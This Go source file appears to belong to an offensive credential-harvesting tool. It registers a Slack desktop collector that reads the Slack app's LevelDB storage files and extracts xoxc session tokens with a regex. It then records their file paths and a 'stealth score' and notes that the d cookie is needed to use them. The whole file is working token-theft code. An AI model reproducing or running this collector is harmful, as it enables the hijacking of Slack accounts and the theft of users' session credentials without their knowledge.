package slack

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

func init() {
	registry.Register("slack", "desktop", func() collector.Collector {
		return &DesktopCollector{BaseCollector: collector.BaseCollector{Svc: "slack", Src: "desktop"}}
	})
}

// DesktopCollector scans the Slack desktop app LevelDB storage for xoxc tokens.
type DesktopCollector struct {
	collector.BaseCollector
}

func (c *DesktopCollector) Service() string          { return c.Svc }
func (c *DesktopCollector) Source() string            { return c.Src }
func (c *DesktopCollector) StealthScore() int         { return 5 }
func (c *DesktopCollector) Platforms() []string       { return nil }
func (c *DesktopCollector) IsPlatformSupported() bool { return true }

var xoxcPattern = regexp.MustCompile(`(xoxc-[A-Za-z0-9-]+)`)

// findStorageDirs returns Slack Local Storage LevelDB directories.
func (c *DesktopCollector) findStorageDirs() []string {
	var dirs []string
	base := platform.SlackDataDir()

	// Slack stores tokens in Local Storage leveldb
	lsDir := filepath.Join(base, "Local Storage", "leveldb")
	if info, err := os.Stat(lsDir); err == nil && info.IsDir() {
		dirs = append(dirs, lsDir)
	}

	// Also check storage directory
	storageDir := filepath.Join(base, "storage")
	if info, err := os.Stat(storageDir); err == nil && info.IsDir() {
		dirs = append(dirs, storageDir)
	}

	return dirs
}

func (c *DesktopCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken

	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to read directory %s: %v", lsDir, err))
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}

			raw, err := os.ReadFile(filepath.Join(lsDir, entry.Name()))
			if err != nil {
				continue
			}

			text := strings.ToValidUTF8(string(raw), "\uFFFD")
			if strings.Contains(text, "xoxc-") {
				results = append(results, &types.DiscoveredToken{
					Service:      c.Svc,
					Source:       c.Src,
					Path:         lsDir,
					StealthScore: c.StealthScore(),
					Details:      "xoxc token found in desktop app",
				})
				break // one discovery per storage dir
			}
		}
	}

	return results
}

func (c *DesktopCollector) Collect() []*types.CollectedToken {
	var results []*types.CollectedToken
	seen := make(map[string]struct{})

	for _, lsDir := range c.findStorageDirs() {
		entries, err := os.ReadDir(lsDir)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to read directory %s: %v", lsDir, err))
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".log") {
				continue
			}

			logPath := filepath.Join(lsDir, entry.Name())
			raw, err := os.ReadFile(logPath)
			if err != nil {
				continue
			}

			text := strings.ToValidUTF8(string(raw), "\uFFFD")

			for _, match := range xoxcPattern.FindAllStringSubmatch(text, -1) {
				tokenVal := match[1]

				// Filter out partial matches
				if len(tokenVal) <= 20 {
					continue
				}

				// Dedup
				if _, exists := seen[tokenVal]; exists {
					continue
				}
				seen[tokenVal] = struct{}{}

				tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
				tok.AccessToken = types.Secure(tokenVal)
				tok.Extra["token_type"] = "xoxc"
				tok.Extra["source_file"] = logPath
				tok.Extra["note"] = "Browser session token — requires d cookie for API calls"

				results = append(results, tok)
			}
		}
	}

	return results
}
